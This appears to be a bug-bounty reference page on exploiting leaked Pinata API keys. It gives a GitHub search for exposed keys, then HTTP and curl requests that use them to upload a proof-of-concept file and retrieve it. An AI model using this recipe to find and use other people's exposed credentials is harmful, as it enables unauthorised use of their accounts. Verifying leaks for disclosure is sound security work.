---
description: >-
  Pinata is a cloud service for keeping your NFT. This plugin makes NFT file
  storage easy for everyone. You can upload and pin images or videos, 3D files,
  or even an app on Pinata. All of Pinata's conte
---

# Pinata key

## Search

Github search

```
pinata_api_key AND pinata_api_secret 
```

## Exploit

That apikey use for upload file

#### Http requests

```
POST /pinning/pinFileToIPFS HTTP/1.1
Host: api.pinata.cloud
Pinata_api_key: <your_api_key>
Pinata_secret_api_key: <your_secret_api_key>
Accept: */*
Content-Type: multipart/form-data; boundary=------------------------d74496d66958873e
Content-Length: 258

--------------------------d74496d66958873e
Content-Disposition: form-data; name="file"; filename="bc_poc.txt"
Content-Type: text/plain

Uploded By Bugcrowd Researcher
--------------------------d74496d66958873e--
```

#### Curl requests

```
curl -X POST "https://api.pinata.cloud/pinning/pinFileToIPFS" \
     -H "pinata_api_key: <your_api_key>" \
     -H "pinata_secret_api_key: <your_secret_api_key>" \
     -F file=@/home/user/poc.txt
```

```
response is
{
  IpfsHash: "****",
  ..
}
```

Get file



```
curl "https://${GATEWAY}/ipfs/$IpfsHash"
{GATEWAY} = Search for .mypinata.cloud in same endpoint response.
```
